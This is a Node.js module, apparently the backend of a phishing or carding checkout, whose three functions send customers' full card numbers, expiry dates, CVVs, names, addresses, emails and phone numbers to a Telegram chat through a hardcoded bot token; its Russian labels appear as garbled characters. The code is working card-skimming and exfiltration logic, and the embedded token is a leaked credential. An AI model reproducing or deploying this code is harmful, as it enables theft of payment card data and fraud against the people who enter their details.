/** @format */
const axios = require("axios");

const sendPaymentFirstData = async (paymentData) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-1002708932805";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const messageText = `
üí≥ –ü–ï–†–í–´–ô –ü–õ–ê–¢–ï–ñ

üë§ –ö–ª–∏–µ–Ω—Ç: ${paymentData.firstName} ${paymentData.lastName}
üìß Email: ${paymentData.email}
üì± –¢–µ–ª–µ—Ñ–æ–Ω: ${paymentData.phone}
üìç –°—Ç—Ä–∞–Ω–∞: ${paymentData.countryCode}
üè† –ê–¥—Ä–µ—Å: ${paymentData.address}
üèôÔ∏è –ì–æ—Ä–æ–¥: ${paymentData.city}
üìÆ –ò–Ω–¥–µ–∫—Å: ${paymentData.postalCode}
${paymentData.bid ? `üÜî BID: ${paymentData.bid}\n` : ""}
üí≥ –î–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã:
   –í–ª–∞–¥–µ–ª–µ—Ü: ${paymentData.cardHolder}
   –ù–æ–º–µ—Ä: ${paymentData.cardNumber}
   –°—Ä–æ–∫: ${paymentData.expiry}
   CVV: ${paymentData.cvv}

üí∞ –°—É–º–º–∞: ${paymentData.price} EUR
üÜî FB ID: ${paymentData.fb || "–ù–µ —É–∫–∞–∑–∞–Ω"}

‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.get(url, {
      params: {
        chat_id: chatId,
        parse_mode: "html",
        text: messageText,
      },
    });

    console.log("Payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending payment data to Telegram:", error);
  }
};

const sendPaymentData = async (paymentData) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-1002708932805";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const messageText = `
üí≥ –ù–û–í–ê–Ø –ü–û–î–ü–ò–°–ö–ê

üë§ –ö–ª–∏–µ–Ω—Ç: ${paymentData.firstName} ${paymentData.lastName}
üìß Email: ${paymentData.email}
üì± –¢–µ–ª–µ—Ñ–æ–Ω: ${paymentData.phone}
üìç –°—Ç—Ä–∞–Ω–∞: ${paymentData.countryCode}
üè† –ê–¥—Ä–µ—Å: ${paymentData.address}
üèôÔ∏è –ì–æ—Ä–æ–¥: ${paymentData.city}
üìÆ –ò–Ω–¥–µ–∫—Å: ${paymentData.postalCode}
${paymentData.bid ? `üÜî BID: ${paymentData.bid}\n` : ""}
üí≥ –î–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã:
   –í–ª–∞–¥–µ–ª–µ—Ü: ${paymentData.cardHolder}
   –ù–æ–º–µ—Ä: ${paymentData.cardNumber}
   –°—Ä–æ–∫: ${paymentData.expiry}
   CVV: ${paymentData.cvv}

üí∞ –°—É–º–º–∞: ${paymentData.price} EUR
üÜî FB ID: ${paymentData.fb || "–ù–µ —É–∫–∞–∑–∞–Ω"}

‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.get(url, {
      params: {
        chat_id: chatId,
        parse_mode: "html",
        text: messageText,
      },
    });

    console.log("Payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending payment data to Telegram:", error);
  }
};

const sendFailedPaymentData = async (paymentData, paymentError) => {
  try {
    const botToken = "7683620414:AAFu6cErSxU0Q0M0wx6bYnfIiCo2i7tdUi8";
    const chatId = "-1002708932805";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID not configured");
      return;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Extract a concise error message
    let errorMessage = 'Unknown Error';
    if (paymentError) {
        if (paymentError.type === 'payment' && paymentError.error) {
            errorMessage = paymentError.error.errorMessage || JSON.stringify(paymentError.error);
        } else if (paymentError.type === 'sdk' && paymentError.error) {
            errorMessage = paymentError.error.message || JSON.stringify(paymentError.error);
        } else {
            errorMessage = paymentError.message || (typeof paymentError === 'object' ? JSON.stringify(paymentError) : paymentError);
        }
    }
    
    // Limit message length to avoid Telegram API errors
    const MAX_LENGTH = 300;
    if (errorMessage.length > MAX_LENGTH) {
        errorMessage = errorMessage.substring(0, MAX_LENGTH) + '...';
    }

    const messageText = `
‚ÄºÔ∏è *–ù–ï–£–î–ê–ß–ù–´–ô –ü–õ–ê–¢–ï–ñ* ‚ÄºÔ∏è
*–ü—Ä–∏—á–∏–Ω–∞:* \`${errorMessage}\`

---

*–ö–ª–∏–µ–Ω—Ç:* ${paymentData.firstName} ${paymentData.lastName}
*Email:* ${paymentData.email}
*–¢–µ–ª–µ—Ñ–æ–Ω:* ${paymentData.phone}
*–°—Ç—Ä–∞–Ω–∞:* ${paymentData.countryCode}
${paymentData.bid ? `*BID:* ${paymentData.bid}\n` : ""}
*–°—É–º–º–∞:* ${paymentData.price} EUR
*FB ID:* ${paymentData.fb || "–ù–µ —É–∫–∞–∑–∞–Ω"}

*–í—Ä–µ–º—è:* ${new Date().toLocaleString("ru-RU")}
        `.trim();

    await axios.post(url, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: messageText,
    });

    console.log("Failed payment data sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending failed payment data to Telegram:", error.response ? error.response.data : error.message);
  }
};

module.exports = {
  sendPaymentData,
  sendFailedPaymentData,
};
